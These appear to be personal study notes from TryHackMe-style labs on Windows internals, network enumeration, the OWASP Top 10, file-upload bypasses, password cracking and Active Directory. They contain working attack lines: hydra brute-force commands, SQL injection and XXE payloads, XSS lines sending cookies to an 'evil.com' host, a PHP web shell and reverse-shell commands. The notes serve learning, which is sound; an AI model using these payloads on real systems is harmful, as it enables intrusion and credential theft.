      echo %path% or echo %username%
    List files in a directory using for loop
      for %i in (*.*) do @echo FILE: %i #'@' is for hide the command prompt
    %windir%: The system  environment variable for the Windows directory
    lusrmgr.msc:  Local User and Group Management
        If you type 'other users' will redirect you to lusrmgr
    gpedit.msc : Local Group Policy Editor
    msconfig
        winver: Display Windows version information
        UserAccountControlSettings
        control.exe /name Microsoft.Troubleshooting
        control.exe system: View basic information about your computer system settings
        control /name Microsoft.WindowsUpdate
        compmgmt.msc: View and configure system settings and components
        msinfo32: View advanced information about hardware and software settings
        eventvwr.msc
        appwiz.cpl
        inetcpl.cpl: View internet properties
        cmd.exe /k %windir%\system32\ipconfig.exe
        perfmon: Monitor the performance of local or remote computers
        resmon: Monitor the performance and resource usage of the local computers
        taskmgr.exe /7
        regedt32.exe
        compmgmt: Administracion de equipos
        net
        wf.msc: Windows Firewall

    Event Viewer
        C:\windows\system32\winevt\logs
        wevtutil /el | Measure-Object : How many log names are in the machine
        wevtutil qe application /c:3 /rd:true /f:text : Count, reverse direction and format
        The Get-WinEvent cmdlet replaces the Get-EventLog cmdlet.
        Get-WinEvent -FilterHashtable @{logname='application'; ProviderName='WLMS'}
        Get-WinEvent -LogName application -FilterXPath 'Event/System/EventID=100': This queries start with '*' or 'Event'
        Get-WinEvent -logname application -FilterXPath 'Event/System/Provider[@Name="WLMS"] and Event/System/EventID=100'
        Get-WinEvent -logname security -FilterXPath 'Event/EventData/Data[@Name="TargetUserName"]="System"' -MaxEvents 5
        Get-WinEvent -path C:\Users\Administrator\Desktop\merged.evtx -FilterXPath 'Event/System/EventID=4104 and Event/EventData/Data[@Name="ScriptBlockText"]' -Oldest -MaxEvents 1 | Format-List
        Get-WinEvent -path C:\Users\Administrator\Desktop\merged.evtx -FilterXPath 'Event/System/EventID=4799'  -MaxEvents 2 | fl -Property *




    Core windows processes
        Tools better than taskmgr.exe: Process hacker and process explorer
        The first Windows process on the list is System. It was mentioned in a previous section that a PID for any given process is assigned at random, but that is not the case for the System process. The PID for System is always 4.
            What is unusual behavior for this process?
                A parent process (aside from System Idle Process (0))
                Multiple instances of System. (Should only be 1 instance)
                A different PID. (Remember that the PID will always be PID 4)
                Not running in Session 0
            The next process is smss.exe (Session Manager Subsystem). This process, also known as the Windows Session Manager, is responsible for creating new sessions. This is the first user-mode process started by the kernel.

            This process starts the kernel mode and user mode of the Windows subsystem (you can read more about the NT Architecture here). This subsystem includes win32k.sys (kernel mode), winsrv.dll (user mode), and csrss.exe (user mode).

            Smss.exe starts csrss.exe (Windows subsystem) and wininit.exe in Session 0, an isolated Windows session for the operating system, and csrss.exe and winlogon.exe for Session 1, which is the user session. The first child instance creates child instances in new sessions. This is done by smss.exe copying itself into the new session and self-terminating.
            What is unusual?

                A different parent process other than System(4)
                Image path is different from C:\Windows\System32
                More than 1 running process. (children self-terminate and exit after each new session)
                User is not SYSTEM
                Unexpected registry entries for Subsystem

            As mentioned in the previous section, csrss.exe (Client Server Runtime Process) is the user-mode side of the Windows subsystem. This process is always running and is critical to system operation. If by chance this process is terminated it will result in system failure. This process is responsible for the Win32 console window and process thread creation and deletion. For each instance csrsrv.dll, basesrv.dll, and winsrv.dll are loaded (along with others).

            This process is also responsible for making the Windows API available to other processes, mapping drive letters, and handling the Windows shutdown process.

            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process masquerading as csrss.exe in plain sight
                User is not SYSTEM

            The Windows Initialization Process, wininit.exe, is responsible for launching services.exe (Service Control Manager), lsass.exe (Local Security Authority), and lsaiso.exe within Session 0. This is another critical Windows process that runs in the background, along with its child processes.


            Note: lsaiso.exe is a process associated with Credential Guard and Key Guard. You will only see this process if Credential Guard is enabled.
            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Multiple running instances
                Not running as SYSTEM

            The next process is the Service Control Manager (SCM), which is services.exe. Its primary responsibility is to handle system services: loading services, interacting with services, starting/ending services, etc. It maintains a database that can be queried using a Windows built-in utility, 'sc.exe.'


            Information regarding services is stored in the registry, HKLM\System\CurrentControlSet\Services.

            What is unusual?

                A parent process other than wininit.exe
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Multiple running instances
                Not running as SYSTEM

            The Service Host (Host Process for Windows Services), or svchost.exe, is responsible for hosting and managing Windows services

            What is unusual?

                A parent process other than services.exe
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                The absence of the -k parameter


            "Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. It also writes to the Windows Security Log."
            There are two types of access tokens:

              primary access tokens: those associated with a user account that are generated on log on
              impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

          For an impersonation token, there are different levels:

              SecurityAnonymous: current user/client cannot impersonate another user/client
              SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
              SecurityImpersonation: current user/client can impersonate the client's security context on the local system
              SecurityDelegation: current user/client can impersonate the client's security context on a remote system

          where the security context is a data structure that contains users' relevant security information.

          The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

              SeImpersonatePrivilege
              SeAssignPrimaryPrivilege
              SeTcbPrivilege
              SeBackupPrivilege
              SeRestorePrivilege
              SeCreateTokenPrivilege
              SeLoadDriverPrivilege
              SeTakeOwnershipPrivilege
              SeDebugPrivilege

            It creates security tokens for SAM (Security Account Manager), AD (Active Directory), and NETLOGON. It uses authentication packages specified in HKLM\System\CurrentControlSet\Control\Lsa.

            The Windows Logon, winlogon.exe, is responsible for handling the Secure Attention Sequence (SAS). This is the ALT+CTRL+DELETE key combination users press to enter their username & password.

            It is also responsible for locking the screen and running the user's screensaver, among other functions.

            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Not running as SYSTEM
                Shell value in the registry other than explorer.exe

            The last process we'll look at is the Windows Explorer, explorer.exe. This is the process that gives the user access to their folders and files. It also provides functionality to other features such as the Start Menu, Taskbar, etc.

            As mentioned previously, the Winlogon process runs userinit.exe, which launches the value in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell. Userinit.exe exits after spawning explorer.exe. Because of this, the parent process is non-existent.

            What is unusual?

                An actual parent process. (userinit.exe calls this process and exits)
                Image file path other than C:\Windows
                Running as an unknown user
                Subtle misspellings to hide rogue process in plain sight
                Outbound TCP/IP connections


Network services
    SMB
        enum4linux
        -U             get userlist
        -M             get machine list
        -N             get namelist dump (different from -U and-M)
        -S             get sharelist
        -P             get password policy information
        -G             get group and member list
        -a             all of the above (full basic enumeration)
        -I             get about LDAP running on the server
        -i             printer information
        -n             nbmlookup

    smbclient
        -L list of shares  Ex: smbclient -L //10.10.0.50/ -U '' -N
        -U Username
        -P
        once inside:
        mput : Upload
            recurse to upload a specified folder ant its contents recursive
        mget: Download
    rpcclient 
      -U "" 10.10.32.51 -N  -c 'enumdomusers'
    telnet
        sudo tcpdump ip proto \\icmp -i tun0
        msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
    ftp
        hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp

    SMTP
        msfconsole
            use 0
            options
            run
        hydra -t 16 -l username -P /usr/share/wordlists/rockyou.txt -vV 10.10.230.202 ssh

    MySQL
        sudo apt install default-mysql-client
        mysql -h [IP] -u [username] -p
        msfconsole >> mysql_sql | mysql_schemadump | mysql_hashdump

cURL
    -X: Request type, eg -X POST
    --data: Which will default to plain text data.
    It does not store cookies and you have to manually specify any cookies and values that you would like to send with your request.
    Cookies are not shared between different browsers.
    curl -c - http://10.10.223.233:8081/ctf/getcookie : To see the cookie that you received
    curl -v --cookie "flagpls=flagpls" http://10.10.223.233:8081/ctf/sendcookie


SQLi
    https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/xplatform.txt
    https://gchq.github.io/CyberChef/
    FlagAuthorised:True
    GET /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people" : about/0 es para no retornar nada legitimo. group_concat es para recoger todos los elementos.
BURP
    <script>alert("Succ3ssful XSS")</script> : To probe an alert in JS
    Intruder: This quality makes Sniper very good for single-position attacks (e.g. a password bruteforce if we know the username or fuzzing for API endpoints).
    Battering Ram: Each item in our list of payloads gets put into every position for each request.
    Pitchfork: Pitchfork uses one payload set per position (up to a maximum of 20) and iterates through them all at once. If we have two lists, one with 100 lines and one with 90 lines, Intruder will only make 90 requests, and the final ten items in the first list will not get tested.


OWASP 10
    1-Injection:
        nc -e /bin/bash
        Linux
            whoami
            id
            ifconfig/ip addr
            uname -a
            ps -ef
            /etc/os-release or lsb_release -a

        Windows
            whoami
            ver
            ipconfig
            tasklist
            netstat -an
    2-Broken authentication
        register a user in a login page with some little changes like " darren" instead of "darren" who exists to gain the same privileges

    3-Sensitive Data Exposure
	sqlite3 to query a flat-file database
            .tables
            PRAGMA table_info(customers); //to see the table informatio

    4-XML External Entity
        Examples of XXE payload
            <!DOCTYPE replace [<!ENTITY name "feast"> ]>
             <userInfo>
              <firstName>falcon</firstName>
              <lastName>&name;</lastName>
             </userInfo>

            <?xml version="1.0"?>
            <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
            <root>&read;</root>

    5-Broken Access Control
    6-Security Misconfiguration
    7-Cross-site Scripting
        Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
        Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
<!DOCTYPE html>
<html>
<head>
<title>This is the page title</title>
</head>
<body>
<h1>This is a Heading</h1>
<p>This is a paragraph.</p>
</body>
</html>
        XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
        Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).

        <script>alert(window.location.hostname)</script>
        <script>document.querySelector('#thm-title').textContent = 'Hey'</script>
        #Exercise: <script>document.location='/log/'+document.cookie</script>
                   <img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '"
    There are three major types of XSS attacks:
      DOM (Special)
              DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the <script></script> HTML tag.
                <iframe src="javascript:alert(`xss`)">
      Persistent (Server-side)
              Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts. 
              Once request captured, add a new header like this. True-Client-IP: <iframe src="javascript:alert(`xss`)">
      Reflected (Client-side)
              Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise search data.



    To disable the browser built-in XSS protection
      Go to the URL bar, type about:config
      Search for browser.urlbar.filter.javascript
      Change the boolean value from True to False

    8- Insecure deserialization
    9-Components with known vulnerabilities
    10-Insufficient logging and monitoring
=============================================
Room: OwaspJuiceShop

1. SQLi
  {"email":"' or 1=1--","password":"no"}
  Why does this work?

      1.The character ' will close the brackets in the SQL query
      2.'OR' in a SQL statement will return true if either side of it is true. As 1=1 is always true, the whole statement is true. Thus it will tell the server that the email is valid, and log us into user id 0, which happens to be the administrator account. The 1=1 can be used when the email or username is not known or invalid
      3.The -- character is used in SQL to comment out data, any restrictions on the login will no longer work as they are interpreted as a comment. This is like the # and // comment in python and javascript respectively

  {"email":"bender@juice-sh.op'--","password":"a"}

2. Broken Authentication
The § § is not two sperate inputs but rather Burp's implementation of quotations e.g. ""
hydra
  hydra -t 4 -l admin@juice-sh.op -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt 10.10.223.38 http-post-form "/#/login:password=^PASS^=yes&login=Log+In&proc_login=true:Invalid email or password."

#Another use of hydra
hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -f 10.10.82.175 -s 8080 http-get /manager/html #Not worked
hydra -l jan -t 4 -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.55.243

Consider the following concrete examples:

    hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ftp will use mark as the username as it iterates over the provided passwords against the FTP server.
    hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.186.248 is identical to the previous example. 10.10.186.248 ftp is the same as ftp://10.10.186.248.
    hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ssh will use frank as the user name as it tries to login via SSH using the different passwords.
    hydra -l <username> -P <wordlist> 10.10.22.33 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
    hydra -t 4 -I -l molly -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.22.33 http-post-form "/login/:username=molly&password=^PASS^:Your username or password is incorrect."
    hydra -L usernames -P passwords 192.208.137.3 http-post-form
"/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid
credentials or user not activated!"

There are some extra optional arguments that you can add:

    -s PORT to specify a non-default port for the service in question.
    -V or -vV, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
    -t n where n is the number of parallel connections to the target. -t 16 will create 16 threads used to connect to the target.
    -d, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this right away.


3. Poison Null Byte
Example: http://10.10.181.162/ftp/package.json.bak >> http://10.10.181.162/ftp/package.json.bak%2500.md  ||| URL encoding

==============================================
Room: Upload vulnerabilities

hosts file do and undo:
  Linux and MacOS ==> /etc/hosts
  sudo sed -i '$d' /etc/hosts

  Windows ==> C:\Windows\System32\drivers\etc\hosts
  (GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts

Overwriting existing files
  Uploading a different file with same name
RCE
  web shell
    <?php echo system($_GET["cmd"]);?>
    <?php system("whoami")?>
    wfuzz --hc=404 -c -t 200 -u http://overwrite.uploadvulns.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    gobuster -x php,txt,html
    After that, go to http://shell.uploadvulns.thm/resources/malicious.php?cmd=id;ls;whoami
  reverse shell
    https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    nc -lvnp 4126
    After that, go to http://shell.uploadvulns.thm/resources/malicious.php

Filtering
  Extension validation
    MS Windows still uses them to identify file types
    Unix use magic numbers
  File type filtering
    MIME validation
      (Multipurpose Internet Mail Extension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request with the format <type>/<subtype>
        Content-Type: image/jpeg
    Magic number validation
  FIle length
  file name     
    "bad characters"
  file content

  Bypassing client-side filtering
    Turn off Javascript in your browser -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
    
    Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below. It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove ^js$|:
      Example: Refresh page and do intercept > response to this request with burp. Eliminate or comment unwanted function. Forward.

    Intercept and modify the file upload. Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.
        Example with a legitimate extension: Intercept when uploading the message and changing extension and MIME

    Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command

  BYpassing server-side filtering: 
    File extensions
      Another example would be testing which is a valid extension and upload other file with 2 extensions. Valid: dog.jpg | Not valid malicious.php | Valid to access: malicious.jpg.php or malicious.jpg.php5

    Magic numbers
      Using hexeditor to check first 8 hex characters and file 
      We could use vim with :%!xxd. To save changes :%!xxd -r
====================
Hashing 

    You can't encrypt the passwords, as the key has to be stored somewhere. If someone gets the key, they can just decrypt the passwords.

    This is where hashing comes in. What if, instead of storing the password, you just stored the hash of the password? This means you never have to store the user's password, and if your database was leaked then an attacker would have to crack each password to find out what the password was. That sounds fairly useful.

    There's just one problem with this. What if two users have the same password? As a hash function will always turn the same input into the same output, you will store the same password hash for each user. That means if someone cracks that hash, they get into more than one account. It also means that someone can create a "Rainbow table" to break the hashes.

    A rainbow table is a lookup table of hashes to plaintexts, so you can quickly find out what password a user had just from the hash. A rainbow table trades time taken to crack a hash for hard disk space, but they do take time to create.


    To protect against rainbow tables, we add a salt to the passwords. The salt is randomly generated and stored in the database, unique to each user. In theory, you could use the same salt for all users but that means that duplicate passwords would still have the same hash, and a rainbow table could still be created specific passwords with that salt.

    The salt is added to either the start or the end of the password before it’s hashed, and this means that every user will have a different password hash even if they have the same password. Hash functions like bcrypt and sha512crypt handle this automatically. Salts don’t need to be kept private.



    Unix style password hashes are very easy to recognise, as they have a prefix. The prefix tells you the hashing algorithm used to generate the hash. The standard format is$format$rounds$salt$hash.

    Windows passwords are hashed using NTLM, which is a variant of md4. They're visually identical to md4 and md5 hashes, so it's very important to use context to work out the hash type.

    On Linux, password hashes are stored in /etc/shadow. This file is normally only readable by root. They used to be stored in /etc/passwd, and were readable by everyone.

    On Windows, password hashes are stored in the SAM. Windows tries to prevent normal users from dumping them, but tools like mimikatz exist for this. Importantly, the hashes found there are split into NT hashes and LM hashes.


============================
John the ripper

john --format=[format] --wordlist=[path]

  A Note on Formats:
    When you are telling john to use formats, if you're dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with raw- to tell john you're just dealing with a standard hash type, though this doesn't always apply. To check if you need to add the prefix or not, you can list all of John's formats using john --list=formats and either check manually, or grep for your hash type using something like john --list=formats | grep -iF "md5".

NTHash / NTLM

  NThash is the hash format that modern Windows Operating System machines will store user and service passwords in. It's also commonly referred to as "NTLM" which references the previous version of Windows format for hashing passwords known as "LM", thus "NT/LM".

  A little bit of history, the NT designation for Windows products originally meant "New Technology", and was used- starting with Windows NT, to denote products that were not built up from the MS-DOS Operating System. Eventually, the "NT" line became the standard Operating System type to be released by Microsoft and the name was dropped, but it still lives on in the names of some Microsoft technologies. 

  You can acquire NTHash/NTLM hashes by dumping the SAM database on a Windows machine, by using a tool like Mimikatz or from the Active Directory database: NTDS.dit. You may not have to crack the hash to continue privilege escalation- as you can often conduct a "pass the hash" attack instead, but sometimes hash cracking is a viable option if there is a weak password policy

Unshadowing
  unshadow [path to passwd] [path to shadow]
  unshadow - Invokes the unshadow tool
  [path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine
  [path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine 

Using single crack mode
  john --single --format=[format] [path to file]

  A Note on File Formats in Single Crack Mode:
    If you're cracking hashes in single crack mode, you need to change the file format that you're feeding john for it to understand what data to create a wordlist from. You do this by prepending the hash with the username that the hash belongs to, so according to the above example- we would change the file hashes.txt
    From:
    1efee03cdcb96d90ad48ccc7b8666033
    To
    mike:1efee03cdcb96d90ad48ccc7b8666033


How to create Custom Rules

  Custom rules are defined in the john.conf file, usually located in /etc/john/john.conf if you have installed John using a package manager or built from source with make and in /opt/john/john.conf on the TryHackMe Attackbox.

  Let's go over the syntax of these custom rules, using the example above as our target pattern. Note that there is a massive level of granular control that you can define in these rules, I would suggest taking a look at the wiki here in order to get a full view of the types of modifier you can use, as well as more examples of rule implementation.

  The first line:
  [List.Rules:THMRules] - Is used to define the name of your rule, this is what you will use to call your custom rule as a John argument.
  We then use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:
  Az - Takes the word and appends it with the characters you define
  A0 - Takes the word and prepends it with the characters you define
  c - Capitalises the character positionally

  These can be used in combination to define where and what in the word you want to modify.

  Lastly, we then need to define what characters should be appended, prepended or otherwise included, we do this by adding character sets in square brackets [ ] in the order they should be used. These directly follow the modifier patterns inside of double quotes " ". Here are some common examples:

  https://campus.barracuda.com/product/campus/doc/5472273/regular-expressions
  [0-9] - Will include numbers 0-9
  [0] - Will include only the number 0
  [A-z] - Will include both upper and lowercase
  [A-Z] - Will include only uppercase letters
  [a-z] - Will include only lowercase letters
  [a] - Will include only a
  [!£$%@] - Will include the symbols !£$%@


  Putting this all together, in order to generate a wordlist from the rules that would match the example password "Polopassword1!" (assuming the word polopassword was in our wordlist) we would create a rule entry that looks like this:
  [List.Rules:PoloPassword]
  cAz"[0-9] [!£$%@]"

  In order to:
    Capitalise the first  letter - c
    Append to the end of the word - Az
    A number in the range 0-9 - [0-9]
    Followed by a symbol that is one of [!£$%@]
  
  Using Custom Rules
  We could then call this custom rule as a John argument using the  --rule=PoloPassword flag.
  As a full command: john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]
  As a note I find it helpful to talk out the patterns if you're writing a rule- as shown above, the same applies to writing RegEx patterns too.

  Jumbo John already comes with a large list of custom rules, which contain modifiers for use almost all cases. If you get stuck, try looking at those rules [around line 678] if your syntax isn't working properly.
-=-=-=-=-

Cracking password protected zip file
Zip2John

  Similarly to the unshadow tool that we used previously, we're going to be using the zip2john tool to convert the zip file into a hash format that John is able to understand, and hopefully crack. The basic usage is like this:
  zip2john [options] [zip file] > [output file]
  [options] - Allows you to pass specific checksum options to zip2john, this shouldn't often be necessary
  [zip file] - The path to the zip file you wish to get the hash of
  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from

  Example Usage
    zip2john zipfile.zip > zip_hash.txt
-=-=-=-=
Cracking a password protected RAR archive
Rar2John

  Almost identical to the zip2john tool that we just used, we're going to use the rar2john tool to convert the rar file into a hash format that John is able to understand. The basic syntax is as follows:
  rar2john [rar file] > [output file]
  rar2john - Invokes the rar2john tool
  [rar file] - The path to the rar file you wish to get the hash of
  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from

  Example Usage
    rar2john rarfile.rar > rar_hash.txt

--=-=-=-=-
Cracking SSH key passwords

  Note that if you don't have ssh2john installed, you can use ssh2john.py, which is located in the /opt/john/ssh2john.py. If you're doing this, replace the ssh2john command with python3 /opt/ssh2john.py or on Kali, python /usr/share/john/ssh2john.py.

  ssh2john [id_rsa private key file] > [output file]

  ssh2john - Invokes the ssh2john tool

  [id_rsa private key file] - The path to the id_rsa file you wish to get the hash of

  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from 

=====================================================
Encryption - Crypto 101

  Passphrase - Separate to the key, a passphrase is similar to a password and used to protect a key.

DO NOT encrypt passwords unless you’re doing something like a password manager. Passwords should not be stored in plaintext, and you should use hashing to manage them safely.
An important thing to remember about modulo is that it’s not reversible. If I gave you an equation: x % 5 = 4, there are infinite values of x that will be valid.

The two main categories of Encryption are symmetric and asymmetric.

  Symmetric encryption uses the same key to encrypt and decrypt the data. Examples of Symmetric encryption are DES (Broken) and AES. These algorithms tend to be faster than asymmetric cryptography, and use smaller keys (128 or 256 bit keys are common for AES, DES keys are 56 bits long).

  Asymmetric encryption uses a pair of keys, one to encrypt and the other in the pair to decrypt. Examples are RSA and Elliptic Curve Cryptography. Normally these keys are referred to as a public key and a private key. Data encrypted with the private key can be decrypted with the public key, and vice versa. Your private key needs to be kept private, hence the name. Asymmetric encryption tends to be slower and uses larger keys, for example RSA typically uses 2048 to 4096 bit keys.

=-=-=-=-=
The math(s) side

  RSA is based on the mathematically difficult problem of working out the factors of a large number. It’s very quick to multiply two prime numbers together, say 17*23 = 391, but it’s quite difficult to work out what two prime numbers multiply together to make 14351 (113x127 for reference).
  The attacking side

  The maths behind RSA seems to come up relatively often in CTFs, normally requiring you to calculate variables or break some encryption based on them. The wikipedia page for RSA seems complicated at first, but will give you almost all of the information you need in order to complete challenges.

  There are some excellent tools for defeating RSA challenges in CTFs, and my personal favorite is https://github.com/Ganapati/RsaCtfTool which has worked very well for me. I’ve also had some success with https://github.com/ius/rsatool.

  The key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.

  “p” and “q” are large prime numbers, “n” is the product of p and q.

  The public key is n and e, the private key is n and d.

  “m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).

-=-=-=-=-=-
SSH authentication
ssh-keygen
  It’s very important to mention that the passphrase to decrypt the key isn’t used to identify you to the server at all, all it does is decrypt the SSH key. The passphrase is never transmitted, and never leaves your system.

ssh -i [keyNameGoesHere] user@host

gpg2john

=======================================
Basics of AD 

The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:

    Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
    Stored by default in %SystemRoot%\NTDS
    accessible only by the domain controller

A forest consists of these parts:
  Trees - A hierarchy of domains in Active Directory Domain Services
  Domains - Used to group and manage objects 
  Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
  Trusts - Allows users to access resources in other domains
  Objects - users, groups, printers, computers, shares
  Domain Services - DNS Server, LLMNR, IPv6
  Domain Schema - Rules for object creation

The four types of users are: 
  Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
  Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
  Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
  Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization

Active Directory groups: 

    Security Groups - These groups are used to specify permissions for a large number of users
    Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration

Default Security Groups - 

  There are a lot of default security groups so I won't be going into too much detail of each past a brief description of the permissions that they offer to the assigned group. Here is a brief outline of the security groups:

    Domain Controllers - All domain controllers in the domain
    Domain Guests - All domain guests
    Domain Users - All domain users
    Domain Computers - All workstations and servers joined to the domain
    Domain Admins - Designated administrators of the domain
    Enterprise Admins - Designated administrators of the enterprise
    Schema Admins - Designated administrators of the schema
    DNS Admins - DNS Administrators Group
    DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
    Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
    Group Policy Creator Owners - Members in this group can modify group policy for the domain
    Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
    Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
    Cert Publishers - Members of this group are permitted to publish certificates to the directory
    Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
    Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
    Key Admins - Members of this group can perform administrative actions on key objects within the domain.
    Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
    Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
    RAS and IAS Servers - Servers in this group can access remote access properties of users

-=-=-=-=-=
Trusts & policies
In some environments trusts can be extended out to external domains and even forests in some cases.

The two types of trusts below: 

    Directional - The direction of the trust flows from a trusting domain to a trusted domain
    Transitive - The trust relationship expands beyond just two domains to include other trusted domains

Domain Policies Overview - 

  Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender

-=-=-=-=-=
Outlined below are the default domain services: 

    LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
    Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
    DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames

Domain authentication overview
    Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.
    NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol

-=-=-=-=-=-=
AD Cloud


Windows Server AD	Azure AD
LDAP	                Rest APIs
NTLM	                OAuth/SAML
Kerberos	        OpenID
OU Tree	                Flat Structure
Domains and Forests	Tenants
Trusts	                Guests
--=-=-=-=-=
AD commands

Get-NetComputer -fulldata | select operatingsystem #gets a list of all operating systems on the domain
Get-NetUser | select cn #gets a list of all users on the domain
Get-ADUser -identity SQLService -properties * # Check properties
(get-wmiobject -class win32_computersystem).partofdomain

-=-=-=-=-=-=
AD attacks
Tools needed
  impacket
  bloodhound
  neo4j

With Kerberos we can use Kerbrute
kerbrute userenum -d spookysec.local --dc 10.10.246.78 userlist.txt

